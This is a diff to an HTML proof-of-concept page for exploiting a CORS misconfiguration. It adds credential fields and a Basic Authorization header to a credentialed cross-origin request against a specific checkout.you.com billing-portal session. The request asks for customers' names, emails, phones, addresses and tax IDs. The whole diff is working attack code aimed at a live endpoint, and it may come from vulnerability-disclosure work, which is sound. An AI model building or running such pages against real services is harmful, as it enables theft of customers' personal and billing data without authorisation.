@@ -3,15 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Misconfiguration PoC</title>
+    <title>CORS Misconfiguration PoC with Basic Auth</title>
 </head>
 <body>
-    <h1>CORS Misconfiguration Test</h1>
+    <h1>CORS Misconfiguration Test (Basic Auth)</h1>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
     <button onclick="testCORS()">Test CORS</button>
     <div id="result"></div>
 
     <script>
         function testCORS() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var auth = btoa(username + ':' + password);
+
             var req = new XMLHttpRequest();
             req.onload = function() {
                 document.getElementById('result').innerText = 'Response received: ' + this.responseText;
@@ -22,6 +28,7 @@
                 document.getElementById('result').innerText = 'CORS request failed';
             };
             req.open('GET', 'https://checkout.you.com/v1/billing_portal/sessions/bps_1Pw06fETU8N2v5f4hdkacCgL/customer?include_only%5B%5D=id%2Cname%2Cemail%2Cphone%2Caddress.city%2Caddress.country%2Caddress.line1%2Caddress.line2%2Caddress.postal_code%2Caddress.state%2Cshipping.address.city%2Cshipping.address.country%2Cshipping.address.line1%2Cshipping.address.line2%2Cshipping.address.postal_code%2Cshipping.address.state%2Ctax_ids.data.id%2Ctax_ids.data.value%2Ctax_ids.data.type%2Ctax_ids.data.country%2Cemail_updatable', true);
+            req.setRequestHeader('Authorization', 'Basic ' + auth);
             req.withCredentials = true;
             req.send();
         }
